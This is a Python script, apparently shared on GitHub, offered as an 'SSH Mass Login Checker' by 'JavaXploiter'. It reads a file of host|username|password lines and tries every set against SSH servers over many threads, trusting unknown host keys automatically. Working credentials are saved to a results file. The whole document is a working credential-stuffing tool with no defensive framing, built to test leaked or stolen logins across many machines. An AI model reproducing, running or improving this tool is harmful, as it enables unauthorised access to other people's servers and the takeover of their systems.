# Jangan Lupa Kasih Stars Yaa _< $ Kalau Mau Recode Cantumpkan Nama Author / Githubnya Juga, Hargai Karya Author

import paramiko
import threading
import os
from colorama import Fore, Style, init
import platform

init(autoreset=True)

def clear_screen():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

def print_title():
    title = """____________________  _______________            ______              
__  ___/_  ___/__  / / /_  ____/__  /_______________  /______________
_____ \_____ \__  /_/ /_  /    __  __ \  _ \  ___/_  //_/  _ \_  ___/
____/ /____/ /_  __  / / /___  _  / / /  __/ /__ _  ,<  /  __/  /    
/____/ /____/ /_/ /_/  \____/  /_/ /_/\___/\___/ /_/|_| \___//_/v1.0
[+]========[ SSH Mass Login Checker Tool By JavaXploiter ]=======[+]
"""
    print(Fore.CYAN + title)

def read_hosts(file_path):
    with open(file_path, 'r') as file:
        lines = file.readlines()
    hosts = []
    for line in lines:
        parts = line.strip().split('|')
        if len(parts) == 3:
            hosts.append(parts)
        else:
            print(Fore.RED + f"Invalid Line Format Dek (skipping): {line.strip()}")
    return hosts

def ssh_login(hostname, username, password, retries=3):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for attempt in range(retries):
        try:
            client.connect(hostname, username=username, password=password, timeout=10)
            print(Fore.GREEN + f"[+] Success: {hostname}")
            return True
        except paramiko.ssh_exception.SSHException as e:
            print(Fore.YELLOW + f"[!] Retry {attempt + 1}/{retries} for {hostname} due to SSHException: {e}")
        except EOFError:
            print(Fore.RED + f"[*] Failed: {hostname} - Connection Closed By Server (EOFError)")
        except Exception as e:
            print(Fore.RED + f"[*] Failed: {hostname} - {e}")
            break
        finally:
            client.close()
    return False

def process_host(host):
    hostname, username, password = host
    if ssh_login(hostname, username, password):
        with open("results/success_logins.txt", "a") as f:
            f.write(f"{hostname}|{username}|{password}\n")

def main(file_path, num_threads):
    if not os.path.exists("results"):
        os.makedirs("results")

    hosts = read_hosts(file_path)
    threads = []

    for host in hosts:
        while threading.active_count() > num_threads:
            pass
        thread = threading.Thread(target=process_host, args=(host,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    clear_screen()  
    print_title()
    file_path = input("[$] Enter Your File .txt List (file.txt): ")
    num_threads = int(input("[$] Enter The NUMBER Of Threads: "))
    main(file_path, num_threads)
